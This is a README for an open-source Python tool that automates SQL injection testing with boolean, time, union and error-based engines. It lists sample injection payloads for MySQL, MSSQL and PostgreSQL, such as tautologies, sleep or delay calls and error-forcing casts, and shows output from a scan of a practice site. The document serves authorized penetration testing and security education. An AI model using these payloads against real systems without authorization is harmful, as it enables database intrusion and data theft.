# SQL Injection Engine Automator 

A comprehensive, modular SQL injection testing framework designed for security professionals, developers, and ethical hackers. This tool automates the detection of SQL injection vulnerabilities across multiple attack vectors with comprehensive payload coverage and professional reporting.


![Demo video](/assets/video.gif)

##  Features

###  Core Capabilities
- **Multi-Vector Testing**: Boolean-based, Time-based, Union-based, and Error-based SQL injection detection
- **Comprehensive Payload Library**: 150+ carefully crafted payloads across all SQL injection types
- **Smart Detection**: Advanced response analysis with configurable thresholds
- **Professional Reporting**: Beautiful HTML reports with detailed findings
- **Modular Architecture**: Easy to extend and customize

###  Testing Engines
- **Boolean-Based**: Detects page content differences between true/false conditions
- **Time-Based**: Identifies delayed responses indicating time-based vulnerabilities
- **Union-Based**: Tests for UNION query injection and data extraction
- **Error-Based**: Analyzes database error messages for information disclosure

###  Supported Databases
- MySQL / MariaDB
- PostgreSQL
- Microsoft SQL Server
- Oracle Database
- SQLite
- And other SQL-compliant databases

## Installation

### Prerequisites
- Python 3.7 or higher
- pip (Python package manager)

### Quick Setup
```bash
# Clone the repository
git clone https://github.com/RicheByte/sqlEngine.git
cd sqlEngine

# Create virtual environment (recommended)
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt
```

### Dependencies
- `requests` - HTTP client for web requests
- `urllib3` - URL handling and SSL management

## 🛠️ Usage

### Basic Scan
```bash
python main.py
```

### Configuration


![configs](/assets/image.png)

Edit `config.py` to customize your scan:

```python
# Target configuration
TARGET_URL = "http://example.com/vulnerable-page.php"
TEST_PARAMS = ["id", "category", "user"]  # Parameters to test

# Engine configurations
TIME_DELAY_THRESHOLD = 3  # Seconds for time-based detection
BOOLEAN_DIFFERENCE_THRESHOLD = 0.3  # Content difference threshold
MAX_PAYLOADS_PER_TEST = 50  # Payloads per engine
```

### Command Line Options
For advanced usage, you can modify `main.py` to accept command-line arguments:

```python
# Example enhancement for command-line support
import argparse

parser = argparse.ArgumentParser(description='SQL Injection Automator')
parser.add_argument('--url', help='Target URL')
parser.add_argument('--params', help='Comma-separated parameters to test')
args = parser.parse_args()
```

##  Project Structure

```
sqli_automator/
├── main.py                 # Main entry point
├── config.py              # Configuration settings
├── engines/               # SQL injection detection engines
│   ├── boolean_engine.py  # Boolean-based detection
│   ├── time_engine.py     # Time-based detection
│   ├── union_engine.py    # Union-based detection
│   └── error_engine.py    # Error-based detection
├── utils/                 # Utility modules
│   ├── http_client.py     # HTTP request handling
│   ├── html_reporter.py   # HTML report generation
│   └── response_analyzer.py # Response analysis
├── payloads/              # SQL injection payload libraries
│   ├── boolean_payloads.txt
│   ├── time_payloads.txt
│   ├── union_payloads.txt
│   └── error_payloads.txt
└── requirements.txt       # Python dependencies
```

##  Advanced Configuration

### Custom Payloads - NEW & IMPROVED! 

The tool now features **smart payload management** that makes it incredibly easy to work with new payloads:

#### Adding New Payloads
Simply add payloads to the text files in the `payloads/` directory - **one payload per line**:

```bash
# Add custom boolean payloads
echo "' OR 1=1 LIMIT 1--" >> payloads/boolean_payloads.txt

# Add custom time-based payloads  
echo "'; SELECT pg_sleep(10)--" >> payloads/time_payloads.txt

# Add comments for organization (lines starting with # are ignored)
echo "# MySQL-specific payloads" >> payloads/error_payloads.txt
echo "' AND ExtractValue(1,CONCAT(0x5c,version()))--" >> payloads/error_payloads.txt
```

#### Smart Payload Features

The script now includes intelligent payload handling:

1. **Automatic Deduplication**: Duplicate payloads are automatically removed
2. **Normalization**: Whitespace is normalized for consistency  
3. **Smart Ordering**: Payloads are ordered by complexity (simple → complex)
4. **No Limits**: By default, ALL payloads from files are used (configurable)
5. **Error Recovery**: Built-in fallback payloads if files are missing

#### Configuration Options

Edit `config.py` to customize payload behavior:

```python
# Payload configurations
MAX_PAYLOADS_PER_TEST = None  # None = use all payloads, or set a number
SKIP_DUPLICATE_PAYLOADS = True  # Automatically remove duplicates
NORMALIZE_PAYLOADS = True  # Clean whitespace
SMART_PAYLOAD_ORDERING = True  # Order by effectiveness
```

#### Payload File Format

Create clean, readable payload files:

```
# Boolean-based payloads for MySQL
' OR '1'='1
' OR '1'='2
' AND 1=1--
' AND 1=2--

# Advanced Boolean payloads
' OR EXISTS(SELECT 1 FROM users)--
' AND (SELECT COUNT(*) FROM information_schema.tables)>10--

# Comments and blank lines are ignored
```

#### Database-Specific Payloads

Organize payloads by database type for better results:

```bash
# MySQL payloads use SLEEP, BENCHMARK, ExtractValue
' AND SLEEP(5)--
' AND BENCHMARK(5000000,MD5('test'))--

# MSSQL payloads use WAITFOR, CONVERT
' AND WAITFOR DELAY '0:0:5'--
' AND 1=CONVERT(int,(SELECT @@version))--

# PostgreSQL payloads use pg_sleep, CAST
' AND pg_sleep(5)--
' AND 1=CAST((SELECT version()) AS int)--
```

### HTTP Client Configuration
Modify `utils/http_client.py` for advanced HTTP settings:

```python
# Custom headers
self.session.headers.update({
    'User-Agent': 'Custom-Scanner/1.0',
    'X-Custom-Header': 'value'
})

# Proxy support
self.session.proxies = {
    'http': 'http://proxy:8080',
    'https': 'https://proxy:8080'
}
```

##  Report Generation

![Reports](/assets/report.png)

The tool generates comprehensive HTML reports with:

- **Executive Summary**: Vulnerability counts and risk assessment
- **Detailed Findings**: Specific payloads and evidence for each vulnerability
- **Scan Metadata**: Timing information and target details
- **Responsive Design**: Mobile-friendly report layout

Sample report location: `scan_report.html`

##  Security Features

### Safe Testing Practices
- Configurable timeouts to prevent hanging requests
- Retry logic for unreliable network conditions
- SSL verification options for testing environments
- Payload limits to prevent excessive requests

### Error Handling
- Comprehensive exception handling across all modules
- Graceful degradation when payload files are missing
- Connection testing before full scan execution

## 🔍 Detection Methodology

### Boolean-Based Detection
- Compares response lengths between true/false conditions
- Uses configurable difference thresholds (default: 30%)
- Tests multiple quote types and comment syntaxes

### Time-Based Detection  
- Measures response delays for sleep-based payloads
- Supports database-specific timing functions
- Handles timeout exceptions as potential indicators

### Union-Based Detection
- Tests various column counts and data types
- Detects database error messages and content changes
- Identifies successful data extraction attempts

### Error-Based Detection
- Analyzes database error messages in responses
- Uses pattern matching for different database systems
- Detects information disclosure through error messages

##  Example Output

```
🔍 Starting SQL Injection Automation...
🎯 Target: http://testphp.vulnweb.com/listproducts.php
📝 Testing Parameters: cat, artist, category

==================================================
Testing parameter: cat
==================================================

⚡ Running Boolean-Based SQLi...
✅ Boolean-Based - VULNERABLE

⚡ Running Time-Based SQLi...
❌ Time-Based - Not vulnerable

📊 SQL INJECTION TEST REPORT
============================================================
🚨 VULNERABILITIES FOUND: 1

• Parameter: cat
  Type: Boolean-Based SQL Injection
  Payload: ' OR '1'='1
  Evidence: Response length changed from 2456 to 128 (difference: 94.79%)

📈 Summary:
   Total tests executed: 4
   Vulnerabilities found: 1
   HTML Report: scan_report.html
```

##  Use Cases

### Penetration Testing
- Automated vulnerability assessment
- Comprehensive coverage of SQL injection techniques
- Professional reporting for client deliverables

### Development Testing
- CI/CD pipeline integration
- Pre-deployment security checks
- Educational purposes for secure coding

### Educational Purposes
- Learning SQL injection techniques
- Understanding web application security
- Security research and methodology

##  Legal & Ethical Usage

### Authorized Testing Only
This tool should only be used on:
- Your own systems and applications
- Systems you have explicit permission to test
- Educational environments designed for security training

### Compliance
- Always obtain proper authorization before testing
- Respect robots.txt and terms of service
- Follow responsible disclosure practices
- Comply with local laws and regulations

##  Troubleshooting

### Common Issues

**Connection Errors:**
```python
# Check network connectivity and URL accessibility
# Verify SSL certificates if using HTTPS
```

**Missing Dependencies:**
```bash
# Reinstall requirements
pip install --force-reinstall -r requirements.txt
```

**Payload File Issues:**
```python
# Tool will use built-in payloads if files are missing
# Check file permissions and paths
```

### Debug Mode
Add debug output by modifying engine classes:

```python
# In any engine file, add:
print(f"   Testing payload: {payload}")
print(f"   Response length: {len(response)}")
```

##  Extending the Tool

### Adding New Engines
1. Create new engine in `engines/` directory
2. Implement the `test()` method
3. Add to engine list in `main.py`

### Custom Payload Formats
Support different payload formats by modifying payload loading:

```python
def _load_payloads(self):
    # Support JSON, YAML, or database sources
    with open('payloads/custom.json') as f:
        return json.load(f)['payloads']
```

##  Contributing

We welcome contributions! Please:

1. Fork the repository
2. Create a feature branch
3. Add tests for new functionality
4. Submit a pull request

### Development Setup
```bash
# Install development dependencies
pip install -r requirements-dev.txt

# Run tests
python -m pytest tests/

# Code formatting
black .
```



##  Acknowledgments

- Security researchers and the infosec community
- Open-source security tools that inspired this project
- Contributors and testers who help improve the tool

---

**Disclaimer**: This tool is for educational and authorized security testing purposes only. The developers are not responsible for any misuse or damage caused by this tool. Always ensure you have proper authorization before conducting any security tests.

---

**Happy (and responsible) hacking!** 